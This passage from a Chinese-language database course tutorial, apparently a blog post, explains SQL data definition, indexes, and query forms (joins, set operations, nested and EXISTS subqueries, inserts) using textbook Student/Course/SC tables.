encoding="application/x-tex">\pi_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>(S)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊆</mo></mrow><annotation encoding="application/x-tex">\subseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊆</span></span></span></span> Yx}<br> 那么 R 除 S，假设 R 中 得 B,C 属性 是 R 和 S 共同属性，那么就找 A 中哪个 A 得元素得象集能包含 S 中所有得 B，C 得取值得。</li></ul><h1 id="三关系数据库标准语言sql"><a class="markdownIt-Anchor" href="#三关系数据库标准语言sql">#</a> 三，关系数据库标准语言 SQL</h1><p><strong>语法说明:</strong></p><blockquote><p><strong>&lt;&gt;</strong>：尖括号用于分隔字符串<br><strong> []</strong>：方括号表示规则中的可选元素，可以选择也可以省略<br><strong> {}</strong>：花括号表示聚集规则中的元素，必须明确指定</p></blockquote><h4 id="1模式得定义和删除"><a class="markdownIt-Anchor" href="#1模式得定义和删除">#</a> 1，模式得定义和删除</h4><p>1，定义模式：CREATE SCHEMA &lt;模式名&gt; AUTHORIZATION &lt; 用户名 &gt;; 若没有指定模式名 则默认为用户名。<br>2，删除模式：DROP SCHEMA &lt;模式名&gt; &lt;CASCADE|RESTRICT&gt;;<br>①CASCADE 和 RESTRICT 必须二选一。<br>②CASCADE (级联删除)<br>③RESTRICT (限制删除)</p><h4 id="2基本表的定义删除和修改"><a class="markdownIt-Anchor" href="#2基本表的定义删除和修改">#</a> 2，基本表的定义，删除和修改</h4><p><strong>1, 创建基本表</strong><br> CREATE TABLE &lt;表名&gt; (&lt; 列名 &gt;&lt; 数据类型 &gt;[&lt; 列级完整性约束条件 &gt;][,&lt; 列名 &gt;&lt; 数据类型 &gt;[&lt; 列级完整性约束条件 &gt;]]…[,&lt; 表级完整性约束条件 &gt;]);</p><ul><li><strong>如果完整性约束条件涉及该表的多个属性列，则必须定义在表级上，否则既可以在列级上也可以在表级上</strong><br>【例 3】：建立学生选课表 <code>SC</code> ，其中 <code>Sno</code>  和 <code>Cno</code>  是外码，分别参照 <code>Student</code>  表的 <code>Sno</code>  列和 <code>Course</code>  表的 <code>Cno</code>  列</li><li><code>Sno</code>  和 <code>Cno</code>  是 <code>SC</code>  的主码，必须使用表级完整性定义</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9),</span><br><span class="line">Cno CHAR(4),</span><br><span class="line">Grade SMALLINT,</span><br><span class="line"></span><br><span class="line">PRIMARY KEY(Sno,Cno),//必须使用表级完整性定义</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno),</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2，修改基本表</strong><br><img src="https://img-blog.csdnimg.cn/ee787b17b1e44ecdb4361f8f76c1b841.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="修改"></p><ul><li><strong> <code>ADD</code> ：用于增加新列，新的列级完整性约束条件和新的表级完整性约束条件</strong></li><li><strong> <code>DROP COLUMN</code> ：用于删除表中的列</strong></li><li><strong> <code>DROP CONSTRAINT</code> ：用于删除指定的完整性约束条件</strong></li><li><strong> <code>ALTER COLUMN</code> ：用于修改原有的列定义</strong><br><strong>（3）删除基本表</strong><br><img src="https://img-blog.csdnimg.cn/fae55e92650e4bfa91e8ccc3a99de49c.png" alt="删除"></li><li><strong>选择 <code>RESTRICT</code> </strong>：欲删除的基本表不能被其他表的约束所引用（比如 CHECK、FOREIGN KEY 等）、不能有视图、不能有触发器（trigger），不能有存储过程或函数等</li><li><strong>选择 <code>CASCADE</code> </strong>：没有限制条件，所有相关依赖对象连同基本表一起删除<br><strong> 3，创建索引</strong><br><strong>作用：建立索引是加快查询速度的有效手段</strong> ： 数据库索引类似于图书后面的索引，能快速定位需要查询的内容。下面是索引的类型：</li><li>顺序文件上的索引</li><li>B + 树索引</li><li>散列索引</li><li>位图索引</li></ul><p><strong>（1）建立索引</strong><br><img src="https://img-blog.csdnimg.cn/dbd9b112a0054167bb3c84d78de6ce81.png" alt="索引"></p><ul><li>&lt;表名&gt;：要建立索引的基本表的名字</li><li>索引可以建立在该表的一列或多列上，各列之间使用逗号分隔</li><li>每个 &lt;列名&gt; 后面还可以用 &lt; 次序 &gt; 指定索引值的排列次序，可选 ASC - 升序（默认）或 DESC - 降序</li><li>UNIQUE：表明此索引的每一个索引值只对应唯一的数据记录</li><li>CLUSTER：表示需要建立聚簇索引 - 一个基本表只能有一个聚簇索引，最快的，但应该在查询多而修改少的表中建立（第七章会讲到）<br><strong>（2）修改索引</strong><br> ALTER INDEX &lt;旧索引名&gt; RENAME TO &lt; 新索引名 &gt;;<br><strong>（3）删除索引</strong><br> DROP INDEX &lt;索引名&gt;;</li></ul><h5 id="span-idlable附加数据字典span"><a class="markdownIt-Anchor" href="#span-idlable附加数据字典span">#</a> <span id="lable">附加：数据字典</span></h5><p>这里提一下一个概念，数据字典。</p><ul><li>关系数据库管理系统内部的一组系统表。</li><li>记录了数据库所有的定义信息，包括模式定义，视图定义，索引定义，完整性约束定义，各类用户对数据库的操作权限，统计信息等。</li><li>RDBMS 执行 SQL 数据定义时，实际上就是更新数据字典。</li></ul><h3 id="基本表的查询"><a class="markdownIt-Anchor" href="#基本表的查询">#</a> 基本表的查询</h3><p><strong>SELECT 语句含义：根据 WHERE 子句的条件表达式从 FROM 子句指定的表、视图中找出满足条件的元组，再按照 SELECT 子句中的目标列表达式选出元组中的属性值形成结果表。如果有：</strong></p><ul><li><strong>GROUP BY：结果按 &lt;列名 1&gt; 的值进行分组，该属性列值相等的元组为一个组；通常会在每组中作用聚集函数；如果该子句还携带 HAVING 短语，则只有满足指定条件的组才予以输出</strong></li><li><strong>ORDER BY：结果表还要按 &lt;列名 2&gt; 的值的升序或降序排序</strong><br><img src="https://img-blog.csdnimg.cn/fbe8bc8bf0624ef7b2f367769c4a0b4e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="select语句"></li></ul><h4 id="一单表查询"><a class="markdownIt-Anchor" href="#一单表查询">#</a> 一，单表查询</h4><p><strong>（1）查询若干列</strong><br> A：查询指定列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sname,Sage from Student;</span><br></pre></td></tr></table></figure><p>B：查询全部列 使用 * 来查询全部列<br> C：查询经过计算的值 可以利用算术表达式<br><strong>（2）查询若干行</strong><br> A：消除取值重复的行（DISTINCT）<br><strong>语法：前面说过投影操作可能会导致相同的行出现所以其结果必须消除重复行。可以使用 <code>DISTINCT</code>  消除</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT Sno from SC;</span><br></pre></td></tr></table></figure><p>B：查询满足条件的元组<br>通过 WHERE 语句实现，常见的查询条件如下：<br><img src="https://img-blog.csdnimg.cn/a3c32c0cd68a43fe8ec27a5be039c2fa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="查询条件"><br>这里用 like 进行字符匹配时有两个通配符</p><blockquote><p>%： 任意长度的字符串。例如: A% b ----------- acb,addgb,ab,…<br>_  ：任意单个字符。例如 a_b ----------- acb,adb,…</p></blockquote><p>这里还要注意一下转义字符： <code>\</code>  这个字符用来转移_ 和 % 例如查询 DB_DESIGN，查询时需要用  <code>LIKE 'DB\_DESIGN'</code>  防止_自动识别任意字符。<br><strong>（3）ORDER BY 语句</strong><br><strong>语法：ORDER BY 子句对查询结果按照一个或多个属性列进行排序</strong></p><ul><li>ASC - 升序（默认）</li><li>DESC - 降序<br>这里给一个例子：查询选修了 3 号课程的学生的学号及其成绩，查询结果按分数降序排列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,Grade</span><br><span class="line">from SC</span><br><span class="line">WHERE Cno=&#x27;3&#x27;</span><br><span class="line">ORDER BY Grade DESC;   --降序排列</span><br></pre></td></tr></table></figure><p><strong>（4）聚集函数</strong><br><img src="https://img-blog.csdnimg.cn/03b2cab78c434dafb90f6accf809a5a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="语法如下"><br>这里只给出一个例子：查询选修 2 号课程的学生最高分数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,MAX(Grade)</span><br><span class="line">FROM SC </span><br><span class="line">WHERE Cno=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><p><strong>（5）GROUP BY 子句</strong><br><strong>语法：GROUP BY 子句将查询结果按某一列或多列的值分组，值相等的分为一组</strong></p><ul><li>分组目的是为了<strong>细化聚集函数的作用对象：若未分组，聚集函数将会作用于整个查询结果；若分组，聚集函数将会作用于每一个组，也即每一个组都有一个函数值</strong></li><li>需要注意：<strong>WHERE 子句作用于整个表或视图，从中选择出满足条件的元组；HAVING 短语作用于组，从中选择满足条件的组</strong><br>这里举出一个例子说明 <code>GROUP BY</code>  的作用，如果我查询各个课程的选修人数，则我需要按照课程号先对每个课程进行分组，再在每一组查询 Sno。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Cno,Count(Sno)</span><br><span class="line">FROM sc</span><br><span class="line">GROUP BY Cno;</span><br></pre></td></tr></table></figure><p>如果我只想显示那些选修人数大于 1 以上的课程，则<strong>可以用 <code>HAVING</code>  语句，在组内进行筛选</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT Cno,Count(Sno)</span><br><span class="line">FROM sc</span><br><span class="line">GROUP BY Cno</span><br><span class="line">HAVING Count(Sno) &gt; 1;</span><br></pre></td></tr></table></figure><h4 id="二连接查询查询时涉及多张表"><a class="markdownIt-Anchor" href="#二连接查询查询时涉及多张表">#</a> 二，连接查询（查询时涉及多张表）</h4><p><strong>(1) 等值连接和非等值连接</strong><br><strong>语法：在 WHERE 子句中写入连接条件（又叫做连接每谓词），其格式为</strong><br><img src="https://img-blog.csdnimg.cn/04445338e11c4257b9e38b00ea959b88.png" alt="连接"><br><strong>其中比较运算符有： <code>=</code> 、 <code>&gt;</code> 、 <code>&lt;</code> 、 <code>&gt;=</code> 、 <code>&lt;=</code> 、 <code>!=</code> </strong></p><ul><li><strong>当运算符为 <code>=</code>  时称之为等值连接</strong></li><li><strong>当运算符不为 <code>=</code>  时称之为非等值连接</strong><br>例子：查询每个学生及其选修课程的情况</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT student.*,sc.*</span><br><span class="line">FROM student,sc</span><br><span class="line">WHERE student.Sno=sc.Sno;</span><br></pre></td></tr></table></figure><p>例子：使用自然连接（即去掉重复列）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT student.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade</span><br><span class="line">FROM student,sc</span><br><span class="line">WHERE student.sno=sc.sno;</span><br></pre></td></tr></table></figure><p><strong>(2) 自身连接</strong><br><strong>语法：所谓自身连接就是指一个表与自己连接</strong><br>例子：查询每一门课的先修课的先修课</p><ul><li>在 <code>Course</code>  表中有的只是每门课的直接先修课，要想得到先修课的先修课，那么就必须先找到一门课的先修课，然后再按此先修课的课程号查找它的先修课</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT ONE.Cno,TWO.Cpno</span><br><span class="line">FROM Course ONE,Course TWO</span><br><span class="line">WHERE ONE.Cpno=TWO.Cno;</span><br></pre></td></tr></table></figure><p><strong>(3) 连接 JOIN</strong><br><strong> 语法：SQL JOIN 用于把来自两个或多个表的行结合起来，其格式如下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM TABLE1//左表</span><br><span class="line">&lt;某某 JOIN&gt;TABLE2//右表</span><br><span class="line">ON TABLE1.column_name=TABLE2.column_name</span><br></pre></td></tr></table></figure><p><strong>有如下几类</strong>： 这里以查询学校内学生及雇员的情况。</p><ul><li><code>INNER JOIN</code> ( <code>JOIN</code> ) 既是学生，又是雇员。</li><li><code>LEFT JOIN</code> ( <code>LEFT OUTER JOIN</code> ) 是学生，可以不是雇员。</li><li><code>RIGHT JOIN</code> ( <code>RIGHT OUTER JOIN</code> ) 可以不是学生，但，是雇员</li><li><code>FULL JOIN</code> ( <code>FULL OUTER JOIN</code> ) 可以不是学生，可以不是雇员。<br><strong>A：INNER JOIN(JOIN)</strong><br><strong> <code>INNER JOIN</code> ( <code>JOIN</code> )：关键字在表中存在至少一个匹配时返回行</strong><br>以 <code>sc</code>  和 <code>course</code>  的 <code>Cno</code>  作为比对标准，将相同连接在一起</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,sc.Cno,Grade,course.Cno,Cname,Cpno,Ccredit</span><br><span class="line">FROM sc INNER JOIN course ON(sc.Cno=course.Cno);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c4702afa17964fe89116980641e9253d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="内连接展示"><br><strong> B：LEFT JOIN (LEFT OUTER JOIN)</strong><br><strong> <code>LEFT JOIN</code> ( <code>LEFT OUTER JOIN</code> )：以左表为标准，若右表中无匹配，则填 NULL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,sc.Cno,Grade,course.Cno,Cname,Cpno,Ccredit</span><br><span class="line">FROM sc LEFT JOIN course ON(sc.Cno=course.Cno);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c45245514e184c8d83c6ceb1b84f0a4d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_15,color_FFFFFF,t_70,g_se,x_16" alt="左外连接"><br><strong> C：RIGHT JOIN (RIGHT OUTER JOIN)</strong><br><strong> <code>RIGHT JOIN</code> ( <code>RIGHT OUTER JOIN</code> )：以右表为标准，若左表中无匹配，则填 NULL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,sc.Cno,Grade,course.Cno,Cname,Cpno,Ccredit</span><br><span class="line">FROM sc RIGHT JOIN course ON(sc.Cno=course.Cno);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/17c4bdf789b242eab9878687a482f149.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="右外连接"><br><strong> D：FULL JOIN (FULL OUTER JOIN)</strong><br><strong> <code>FULL JOIN</code> ( <code>FULL OUTER JOIN</code> )：本质就是结合了 LEFT JOIN 和 RIGHT JOIN</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,sc.Cno,Grade,course.Cno,Cname,Cpno,Ccredit</span><br><span class="line">FROM sc FULL JOIN course ON(sc.Cno=course.Cno);</span><br></pre></td></tr></table></figure><p><strong>(4) 符合条件连接</strong><br><strong>语法：没有什么新的东西，就是涉及多张表，多个条件的查询</strong><br><strong> (5) 集合操作的多关系查询</strong><br>集合操作主要有 union,intersect 和 except<br> 且集合操作一般可以利用多条条件语句代替<br><strong> A，UNION</strong><br> 查询计算机系的学生以及年龄不大于 19 岁的学生</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’</span><br><span class="line">Union  </span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sage &lt;= 19;</span><br><span class="line">--上述等价于下述</span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’  </span><br><span class="line">or Sage &lt;= 19;</span><br></pre></td></tr></table></figure><p><strong>B, INTERSECT</strong><br> 查询计算机系的学生与年龄不大于 19 岁的学生的交集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’  </span><br><span class="line">intersect  </span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sage&lt;=19;</span><br><span class="line">--上述等价于下述</span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’  </span><br><span class="line">and Sage &lt;= 19;</span><br></pre></td></tr></table></figure><p><strong>C, EXCEPT</strong><br> 查询计算机系的学生与年龄不大于 19 岁的学生的差集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’  </span><br><span class="line">except  </span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sage&lt;=19;</span><br><span class="line">--上述等价于下述</span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’  </span><br><span class="line">and Sage &gt; 19;</span><br></pre></td></tr></table></figure><h4 id="三嵌套查询"><a class="markdownIt-Anchor" href="#三嵌套查询">#</a> 三，嵌套查询</h4><p>在 SQL 中，一个 <code>SELECT-FROM-WHERE</code>  语句称为一个<strong>查询块</strong>，<strong>将一个查询块嵌套在另一个查询块的 WHERE 子句或 HAVING 短语的条件中的查询称之为嵌套查询。比如:</strong> 内层循环查出来的是符合 <code>Cno=2</code>  的 <code>Sno</code>  集合，外层循环则在该集合内查询是否有满足的 <code>Sno</code> ，有的话显示 <code>Sname</code>  即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sname //外层查询</span><br><span class="line">FROM Student</span><br><span class="line">WHERE Sno IN</span><br><span class="line">(</span><br><span class="line">SELECT Sno //内层查询</span><br><span class="line">FROM SC</span><br><span class="line">WHERE Cno=&#x27;2&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>需要注意下面几点：</p><ul><li><strong>子查询的 SELECT 语句不能使用 <code>ORDER BY</code>  子句</strong></li><li><strong>嵌套查询往往可以转换为对应的连接运算</strong><br>嵌套查询分为不相关子查询和相关子查询。</li><li>不相关子查询：求解方法由里向外</li><li>相关子查询：求解方法由外向里<br><strong> (1) 带有 IN 谓词的子查询</strong><br><strong>语法：嵌套查询中，子查询的结果往往是一个集合，所以 IN 在嵌套查询中使用次数最为频繁</strong><br>例子：查询与 “刘晨” 在同一个系学习的学生</li><li>考虑时可以由内向外，<strong>先查询出刘晨所在的系，然后在该集合中查询满足该集合的学生姓名</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT student.Sno,Sname,Sdept FROM student WHERE Sdept IN</span><br><span class="line">(SELECT Sdept FROM student WHERE Sname=&#x27;刘晨&#x27;);</span><br></pre></td></tr></table></figure><p>当然嵌套查询也可以转为<strong>连接</strong>完成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT S1.Sno,S1.Sname,S1.Sdept</span><br><span class="line">FROM Student S1,Student S2</span><br><span class="line">WHERE S1.Sdept=S2.Sdept AND S2.Sname=&#x27;刘晨&#x27;;</span><br></pre></td></tr></table></figure><p><strong>(2) 带有比较运算符的子查询</strong><br><strong>语法：带有比较运算符的子查询是指父查询与子查询之间用比较运算符进行连接。当用户能确切知道内层查询返回的是单个值时，可以使用 <code>&gt;</code> 、 <code>&lt;</code> 、 <code>=</code> 、 <code>&gt;=</code> 、 <code>&lt;=</code> 、 <code>!=</code>  等比较运算符</strong><br>例子：查询与 “刘晨” 在同一个系学习的学生</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,Sname,Sdept FROM student WHERE Sdept</span><br><span class="line">= (SELECT Sdept FROM student WHERE Sname=&#x27;刘晨&#x27;);</span><br></pre></td></tr></table></figure><p><strong>（3）带有 ANY（SOME）或 ALL 谓词的子查询</strong><br><strong>语法：内层查询返回单个值时使用比较运算符。如果返回多个值要用 <code>ANY</code> （有的是 SOME）或 <code>ALL</code> ，然后同时使用比较运算符</strong><br><img src="https://img-blog.csdnimg.cn/c5550c56e34f4b0bac6f2ce4899ad1c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="样例"><br>例子：查询其他系比计算机科学系<strong>任意</strong>一个学生年龄小的学生姓名和年龄</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sname,Sage FROM student WHERE Sage &lt; ANY</span><br><span class="line">(SELECT Sage FROM student WHERE Sdept=&#x27;CS&#x27;)</span><br><span class="line">AND Sdept!=&#x27;CS&#x27;;   </span><br><span class="line">-- &lt; ANY 等价于 &lt; MAX  其等价写法如下</span><br><span class="line">SELECT Sname,Sage FROM student WHERE Sage &lt;</span><br><span class="line">(SELECT MAX(Sage) FROM student WHERE Sdept=&#x27;CS&#x27;)</span><br><span class="line">AND Sdept!=&#x27;CS&#x27;;</span><br></pre></td></tr></table></figure><p><strong>（4）带有 EXISTS 谓词的子查询</strong><br><strong>语法</strong>：EXISTS 代表存在量词，其不返回任何数据，只返回 <code>TRUE</code>  或者 <code>FALSE</code> 。另外，由 EXISTS 引出的子查询，其目标列表达式都是 *，因为列名没有意义。（写啥都行 1 也行)</p><ul><li>若内层查询结果非空，则外层 WHERE 子句返回 <code>true</code></li><li>若内层查询结果为空，则外层 WHERE 子句返回 <code>false</code> <br> 与之相反的有  <code>NOT EXISTS</code> 。<br><strong>需要注意的是，一些带有 EXISTS 和 NOT EXISTS 谓词的子查询不能被其他形式的子查询等价替换；但是所有带 IN 谓词，比较运算符，ANY 和 ALL 谓词的子查询都可以用带 EXISTS 谓词的子查询替换</strong><br>例子：查询所有选修了 1 号课程的学生姓名</li><li>处理时，首先会取外层查询中 <code>Student</code>  表的第一个元组，根据它与内层查询相关的属性值（ <code>Sno</code> ）处理内层查询，若 <code>WHERE</code>  子句返回为 <code>true</code>  则取外层查询中该元组的 <code>Sname</code>  放入结果表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sname FROM student WHERE </span><br><span class="line">EXISTS</span><br><span class="line">(SELECT * from sc where Sno=student.Sno AND Cno=&#x27;1&#x27;);</span><br></pre></td></tr></table></figure><p>例子 2：查询一个学生选修了所有的课程<br>着等价于：<strong>查询这样一个学生，没有一门课它是不选的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sname FROM Student WHERE NOT EXISTS(</span><br><span class="line">SELECT * FROM Course WHERE NOT EXISTS(SELECT * FROM SC </span><br><span class="line">WHERE Sno = Stident.Sno</span><br><span class="line">AND Cno = Course.Cno</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="数据更新"><a class="markdownIt-Anchor" href="#数据更新">#</a> 数据更新</h3><h5 id="一插入数据"><a class="markdownIt-Anchor" href="#一插入数据">#</a> 一，插入数据</h5><p><strong>语法：格式如下，用于将新元组插入指定表中。需要注意</strong></p><ul><li><code>INTO</code>  子句中没有出现的属性列，新元组在这些列上将会取 <code>NULL</code></li><li>若 <code>INTO</code>  子句中没有指明任何属性列名，则新插入的元祖必须在每个属性列上均有值<br><img src="https://img-blog.csdnimg.cn/93a441256646481a9039e63212692a3b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="插入"><br>例子：将一个新学生元组 <strong>（学号：200215128；姓名：陈冬；性别：男；所在系：IS；年龄：18 岁）</strong> 插入到 Student 表中</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT</span><br><span class="line">INTO student(Sno,Sname,Ssex,Sdept,Sage)</span><br><span class="line">VALUES(&#x27;201215128&#x27;,&#x27;陈冬&#x27;,&#x27;男&#x27;,&#x27;IS&#x27;,18);</span><br></pre></td></tr></table></figure><p>插入多条记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">INSERT </span><br><span class="line">INTO student </span><br><span class="line">VALUES </span><br><span class="line">(201515000,&#x27;小赵&#x27;,&#x27;男&#x27;,30,&#x27;IS&#x27;)，</span><br><span class="line">(201515001,&#x27;小钱&#x27;,&#x27;女&#x27;,28,&#x27;MA&#x27;)，</span><br><span class="line">(201515002,&#x27;小孙&#x27;,&#x27;男&#x27;,33,&#x27;MJ&#x27;)，</span><br><span class="line">(201515003,&#x27;小李&#x27;,&#x27;女&#x27;,25,&#x27;CS&#x27;)，</span><br><span class="line">(201515004,&#x27;小周&#x27;,&#x27;男&#x27;,41,&#x27;LI&#x27;);</span><br></pre></td></tr></table></figure><h5 id="二修改数据-update"><a 